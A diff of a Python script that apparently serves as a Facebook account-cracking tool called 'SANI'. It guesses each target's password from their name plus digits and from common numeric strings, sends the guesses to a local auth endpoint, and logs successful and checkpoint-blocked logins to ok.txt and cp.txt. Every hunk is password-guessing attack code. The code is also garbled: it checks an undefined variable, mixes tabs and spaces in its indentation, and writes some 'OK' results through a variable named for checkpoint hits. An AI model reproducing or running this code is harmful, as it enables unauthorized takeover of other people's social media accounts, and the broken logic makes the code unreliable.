@@ -348,7 +348,7 @@ def b_menu_select():
 		    pass1=name+"1234"
 		    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
                     if 'www.facebook.com' in d['error_msg']:
-		        print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass1+" | "+name)
+		        print("\x1b[1;93m[SANI-CP]➤ "+uid+" | "+pass1+" | "+name)
 		        cp=open("cp.txt","a")
 		        cp.write(uid+" | "+pass1+"\n")
 		        cp.close()
@@ -356,25 +356,25 @@ def b_menu_select():
 		    else:
 		    	q = json.loads(data)
 		        if 'loc' in q:
-		            print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass2+" | "+name)
+		            print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass1+" | "+name)
 		            ok=open("ok.txt","a")
-		            ok.write(uid+" | "+pass2+"\n")
+		            ok.write(uid+" | "+pass1+"\n")
 		            ok.close()
-		            oks.append(uid + pass2)
+		            oks.append(uid + pass1)
 		        else:
 		            pass2=name+"12345"
 		            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                             q = json.loads(data)
-		            if 'loc' in q:
-		                print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass2+" | "+name)
-		                ok=open("ok.txt","a")
-		                ok.write(uid+" | "+pass2+"\n")
-		                ok.close()
-		                oks.append(uid + pass2)
+		            if 'www.facebook.com' in d['error_msg']:
+		                print("\x1b[1;93m[SANI-CP]➤ "+uid+" | "+pass2+" | "+name)
+		                cp=open("cp.txt","a")
+		                cp.write(uid+" | "+pass2+"\n")
+		                cp.close()
+		                cps.append(uid + pass2)
 		            else:
-		    	        if 'www.facebook.com' in d['error_msg']:
-		                    print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass2+" | "+name)
-		                    cp=open("cp.txt","a")
+		    	        if 'loc' in q:
+		                    print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass2+" | "+name)
+		                    cp=open("ok.txt","a")
 		                    cp.write(uid+" | "+pass2+"\n")
 		                    cp.close()
 		                    cps.append(uid + pass2)
@@ -382,87 +382,87 @@ def b_menu_select():
 		                    pass3="234567"
 		                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                                     q = json.loads(data)
-		                    if 'loc' in q:
-		                        print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass3+" | "+name)
-		                        ok=open("ok.txt","a")
-		                        ok.write(uid+" | "+pass3+"\n")
-		                        ok.close()
-		                        oks.append(uid + pass3)
+		                    if 'www.facebook.com' in d['error_msg']:
+		                        print("\x1b[1;93m[SANI-CP]➤ "+uid+" | "+pass3+" | "+name)
+		                        cp=open("cp.txt","a")
+		                        cp.write(uid+" | "+pass3+"\n")
+		                        cp.close()
+		                        cps.append(uid + pass3)
 		                    else:
-		    	                if 'www.facebook.com' in d['error_msg']:
-		                            print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass3+" | "+name)
-		                            cp=open("cp.txt","a")
-		                            cp.write(uid+" | "+pass3+"\n")
-		                            cp.close()
-		                            cps.append(uid + pass3)
+		    	                if 'loc' in q:
+		                            print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass3+" | "+name)
+		                            ok=open("ok.txt","a")
+		                            ok.write(uid+" | "+pass3+"\n")
+		                            ok.close()
+		                            oks.append(uid + pass3)
 		                        else:
 		                            pass4="223344"
 		                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                                             q = json.loads(data)
-		                            if 'loc' in q:
-		                                print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass4+" | "+name)
-		                                ok=open("ok.txt","a")
-		                                ok.write(uid+" | "+pass4+"\n")
-		                                ok.close()
-		                                oks.append(uid + pass4)
+		                            if 'www.facebook.com' in d['error_msg']:
+		                                print("\x1b[1;93m[SANI-CP]➤ "+uid+" | "+pass4+" | "+name)
+		                                cp=open("cp.txt","a")
+		                                cp.write(uid+" | "+pass4+"\n")
+		                                cp.close()
+		                                cps.append(uid + pass4)
 		                            else:
-		    	                        if 'www.facebook.com' in d['error_msg']:
-		                                    print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass4+" | "+name)
-		                                    cp=open("cp.txt","a")
-		                                    cp.write(uid+" | "+pass4+"\n")
-		                                    cp.close()
-		                                    cps.append(uid + pass4)
+		    	                        if 'loc' in q:
+		                                    print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass4+" | "+name)
+		                                    ok=open("ok.txt","a")
+		                                    ok.write(uid+" | "+pass4+"\n")
+		                                    ok.close()
+		                                    oks.append(uid + pass4)
 		                                else:
 		                                    pass5="786786786"
 		                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
                                                     q = json.loads(data)
-		                                    if 'loc' in q:
-		                                        print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass5+" | "+name)
-		                                        ok=open("ok.txt","a")
-		                                        ok.write(uid+" | "+pass5+"\n")
-		                                        ok.close()
-		                                        oks.append(uid + pass5)
+		                                    if 'www.facebook.com' in d['error_msg']:
+		                                        print("\x1b[1;93m[SANI-CP]➤ "+uid+" | "+pass5+" | "+name)
+		                                        cp=open("cp.txt","a")
+		                                        cp.write(uid+" | "+pass5+"\n")
+		                                        cp.close()
+		                                        cps.append(uid + pass5)
 		                                    else:
-		    	                                if 'www.facebook.com' in d['error_msg']:
-		                                            print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass5+" | "+name)
-		                                            cp=open("cp.txt","a")
-		                                            cp.write(uid+" | "+pass5+"\n")
-		                                            cp.close()
-		                                            cps.append(uid + pass5)
+		    	                                if 'loc' in q:
+		                                            print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass5+" | "+name)
+		                                            ok=open("ok.txt","a")
+		                                            ok.write(uid+" | "+pass5+"\n")
+		                                            ok.close()
+		                                            oks.append(uid + pass5)
 		                                        else:
 		                                            pass6="445566"
 		                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
                                                             q = json.loads(data)
-		                                            if 'loc' in q:
-		                                                print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass6+" | "+name)
-		                                                ok=open("ok.txt","a")
-		                                                ok.write(uid+" | "+pass6+"\n")
-		                                                ok.close()
-		                                                oks.append(uid + pass6)
+		                                            if 'www.facebook.com' in d['error_msg']:
+		                                                print("\x1b[1;93m[SANI-CP]➤ "+uid+" | "+pass6+" | "+name)
+		                                                cp=open("cp.txt","a")
+		                                                cp.write(uid+" | "+pass6+"\n")
+		                                                cp.close()
+		                                                cps.append(uid + pass6)
 		                                            else:
-		    	                                        if 'www.facebook.com' in d['error_msg']:
-		                                                    print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass6+" | "+name)
-		                                                    cp=open("cp.txt","a")
-		                                                    cp.write(uid+" | "+pass6+"\n")
-		                                                    cp.close()
-		                                                    cps.append(uid + pass6)
+		    	                                        if 'loc' in q:
+		                                                    print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass6+" | "+name)
+		                                                    ok=open("ok.txt","a")
+		                                                    ok.write(uid+" | "+pass6+"\n")
+		                                                    ok.close()
+		                                                    oks.append(uid + pass6)
 		                                                else:
 		                                                    pass7="556677"
 		                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
                                                                     q = json.loads(data)
-		                                                    if 'loc' in q:
-		                                                        print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass7+" | "+name)
-		                                                        ok=open("ok.txt","a")
-		                                                        ok.write(uid+" | "+pass7+"\n")
-		                                                        ok.close()
-		                                                        oks.append(uid + pass7)
+		                                                    if 'www.facebook.com' in d['error_msg']:
+		                                                        print("\x1b[1;93m[SANI-CP]➤ "+uid+" | "+pass7+" | "+name)
+		                                                        cp=open("cp.txt","a")
+		                                                        cp.write(uid+" | "+pass7+"\n")
+		                                                        cp.close()
+		                                                        cps.append(uid + pass7)
 		                                                    else:
-		    	                                                if 'www.facebook.com' in d['error_msg']:
-		                                                            print("\x1b[1;93m[SANI-CP] "+uid+" | "+pass7+" | "+name)
-		                                                            cp=open("cp.txt","a")
-		                                                            cp.write(uid+" | "+pass7+"\n")
-		                                                            cp.close()
-		                                                            cps.append(uid + pass7)
+		    	                                                if 'loc' in q:
+		                                                            print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass7+" | "+name)
+		                                                            ok=open("ok.txt","a")
+		                                                            ok.write(uid+" | "+pass7+"\n")
+		                                                            ok.close()
+		                                                            oks.append(uid + pass7)
 															
 		except:
 			pass
